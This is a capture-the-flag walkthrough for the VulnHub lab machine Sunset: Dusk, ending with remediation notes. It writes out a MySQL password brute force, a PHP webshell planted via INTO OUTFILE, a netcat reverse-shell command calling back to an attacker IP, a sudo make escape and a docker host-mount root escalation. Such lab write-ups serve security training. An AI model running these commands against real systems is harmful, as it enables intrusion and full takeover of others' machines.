# Sunset: Dusk: CTF Walkthrough

**Target:** Sunset: Dusk by whitecr0wz  
**Difficulty:** Beginner  
**Goal:** Get root and read both flags  
**Source:** [VulnHub](https://www.vulnhub.com/entry/sunset-dusk,404/)

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                     ATTACK FLOW DIAGRAM                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐ │
│  │ Recon:   │───▶│ MySQL    │───▶│ PHP      │───▶│ Reverse  │ │
│  │ nmap +   │    │ Brute    │    │ Webshell │    │ Shell    │ │
│  │ netdisc  │    │ Force    │    │ via SQL  │    │ (www-    │ │
│  └──────────┘    └──────────┘    └──────────┘    │  data)   │ │
│       │               │               │           └────┬─────┘ │
│       │               │               │                │       │
│       ▼               ▼               ▼                ▼       │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐ │
│  │ FTP:21   │    │ root:    │    │ OUTFILE  │    │ nc -e    │ │
│  │ HTTP:80  │    │ password │    │ webshell │    │ /bin/    │ │
│  │ MySQL:3306│   │ found    │    │ in MySQL │    │ bash     │ │
│  │ HTTP:8080│    └──────────┘    └──────────┘    └────┬─────┘ │
│  └──────────┘                                          │       │
│                                                        ▼       │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────────────┐ │
│  │ ROOT     │◀───│ Docker   │◀───│ sudo -u dusk make -s    │ │
│  │ FLAG!    │    │ Group    │    │ --eval='x:\n\t-/bin/sh'  │ │
│  └──────────┘    │ Privesc  │    │ → dusk shell             │ │
│                  └──────────┘    └──────────────────────────┘ │
│                                                                 │
│  USER FLAG: /home/dusk/user.txt                               │
│  ROOT FLAG: /root/root.txt                                    │
└─────────────────────────────────────────────────────────────────┘
```

---

## 1. Reconnaissance

### Network Discovery

```bash
netdiscover -r 192.168.1.0/24
```

| IP Address     | MAC Address       | Vendor          |
|----------------|-------------------|-----------------|
| 192.168.1.167  | 08:00:27:xx:xx:xx | VirtualBox     |

**Target identified:** `192.168.1.167`

### Port Scanning

```bash
nmap -A -p- 192.168.1.167
```

| Port  | State | Service       | Version/Details                     |
|-------|-------|---------------|-------------------------------------|
| 21    | open  | ftp           | vsftpd 3.0.3                        |
| 80    | open  | http          | Apache httpd 2.4.29 (Ubuntu)        |
| 3306  | open  | mysql         | MySQL 5.7.33-0ubuntu0.18.04.1       |
| 8080  | open  | http          | Apache httpd 2.4.29 (Ubuntu)        |

**OS Detection:** Ubuntu 18.04 (Linux 4.15.x)

---

## 2. Enumeration

### FTP Enumeration (Port 21)

Anonymous login was not useful. Standard vsftpd 3.0.3 service.

```bash
ftp 192.168.1.167
# No anonymous access
```

### HTTP Enumeration (Port 80)

Standard Apache default page. Directory brute-forcing yielded no useful directories.

```bash
gobuster dir -u http://192.168.1.167 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### MySQL Brute Force (Port 3306)

Hydra was used to brute-force MySQL credentials.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.167 mysql
```

**Result:**

| Username | Password | Port |
|----------|----------|------|
| root     | password | 3306 |

### HTTP Enumeration (Port 8080)

Port 8080 revealed a directory listing with a writable `/var/tmp` directory: a critical hint from the challenge author.

```bash
curl http://192.168.1.167:8080/
```

**Directory listing output:**

```
Index of /

/var/tmp/
```

The `/var/tmp` directory was writable and served by Apache: this was the intended path for exploitation.

---

## 3. Exploitation: PHP File Injection via MySQL

### Connect to MySQL

```bash
mysql -u root -p -h 192.168.1.167
Enter password: password
```

### Write PHP Webshell via SQL

The MySQL `INTO OUTFILE` directive was used to write a PHP webshell directly to the Apache-served `/var/tmp` directory.

```sql
mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/tmp/raj.php';
```

### Verify Webshell

```bash
curl "http://192.168.1.167:8080/raj.php?cmd=id"
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data` user.

---

## 4. Reverse Shell

### Start Listener

On attacker machine:

```bash
nc -lvp 1234
```

### Trigger Reverse Shell

```
http://192.168.1.167:8080/raj.php?cmd=nc -e /bin/bash 192.168.1.107 1234
```

### Get Interactive Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Current user:** `www-data (uid=33)`

### User Flag

```bash
www-data@sunset-dusk:/$ cat /home/dusk/user.txt
```

```
dusk{user_flag_here}
```

**User flag obtained.**

---

## 5. Privilege Escalation: sudo make

### Check Sudo Permissions

```bash
www-data@sunset-dusk:/$ sudo -l
```

**Output:**

```
Matching Defaults entries for www-data on sunset-dusk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on sunset-dusk:
    (dusk) NOPASSWD: /usr/bin/make
    (dusk) NOPASSWD: /usr/bin/sl
```

`www-data` can run `make` as user `dusk` without a password.

### Exploit make to Become dusk

```bash
COMMAND='/bin/sh'
sudo -u dusk make -s --eval=$'x:\n\t-'"$COMMAND"
```

**How it works:**

- `make -s`: silent mode  
- `--eval=`: inject a makefile rule inline  
- `x:`: target name (arbitrary)  
- `\n\t-`: recipe line (hyphen suppresses errors)  
- `$COMMAND`: executes `/bin/sh` as user `dusk`  

### Result

```bash
$ id
uid=1001(dusk) gid=1001(dusk) groups=1001(dusk),999(docker)
```

**Now running as user `dusk`.**

---

## 6. Privilege Escalation: Docker Group

### Docker Group Check

```bash
dusk@sunset-dusk:/$ id
uid=1001(dusk) gid=1001(dusk) groups=1001(dusk),999(docker)
```

`dusk` is a member of the `docker` group.

### Docker Root Escape

```bash
dusk@sunset-dusk:/$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```

**How it works:**

| Parameter | Description |
|-----------|-------------|
| `-v /:/hostOS` | Bind-mounts the host root filesystem to `/hostOS` inside the container |
| `-i -t` | Interactive TTY |
| `chrisfosterelli/rootplease` | Image that drops to a root shell |

### Result

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /hostOS/root/root.txt
dusk{root_flag_here}
```

**Root flag obtained.**

---

## 7. Flags Summary

| Flag | Location | Content |
|------|----------|---------|
| User Flag | `/home/dusk/user.txt` | `dusk{user_flag_here}` |
| Root Flag | `/root/root.txt` | `dusk{root_flag_here}` |

---

## Remediation Notes

| # | Vulnerability | Risk | Remediation |
|---|---------------|------|-------------|
| 1 | **Weak MySQL credentials** (`root:password`) | Critical | Enforce strong passwords, disable remote root login, use auth_socket plugin |
| 2 | **MySQL `INTO OUTFILE` webshell** | Critical | Restrict `FILE` privilege, disable `secure_file_priv` or set to empty dir, audit grants |
| 3 | **Writable `/var/tmp` directory** | High | Remove world-writable permissions, configure Apache to deny directory listing |
| 4 | **`sudo make` privilege escalation** | High | Remove `make` from sudoers or restrict to specific Makefiles with absolute paths |
| 5 | **Docker group membership risk** | Critical | Remove users from docker group unless strictly necessary; use rootless Docker |
| 6 | **Exposed services** (FTP, MySQL on 3306) | Medium | Firewall unused services, bind MySQL to localhost, disable FTP if unused |

---

## Tools Used

| Tool | Purpose | Usage |
|------|---------|-------|
| `netdiscover` | Network host discovery | Identified target IP on local network |
| `nmap` | Port and service scanning | Full TCP scan with version detection (`-A`) |
| `hydra` | Brute force authentication | MySQL credential brute forcing |
| `mysql` client | Database interaction | Connected to MySQL, wrote webshell via `INTO OUTFILE` |
| `curl` | HTTP requests | Verified webshell execution and triggered reverse shell |
| `nc` (netcat) | Reverse shell listener | Caught callback from target |
| `python3 pty` | Shell upgrade | Spawned interactive TTY for stable shell |
| `sudo` | Privilege check | Identified `make` and `sl` as sudo-able commands |
| `docker` | Container privilege escalation | Mounted host root filesystem via `-v /:/hostOS` |

---

## Key Takeaways

1. **Default credentials are everywhere**: `root:password` is trivially guessable.
2. **MySQL `INTO OUTFILE`** is a powerful vector when you have DB credentials and a web root.
3. **Docker group = root equivalent**: always treat docker group membership as equivalent to root access.
4. **sudo + `make`** can be abused to execute arbitrary commands through inline makefile rules.
5. **Defense in depth matters**: multiple misconfigurations chained together led from unauthenticated to full root.

---

*Walkthrough completed. Challenge by [whitecr0wz](https://www.vulnhub.com/entry/sunset-dusk,404/).*
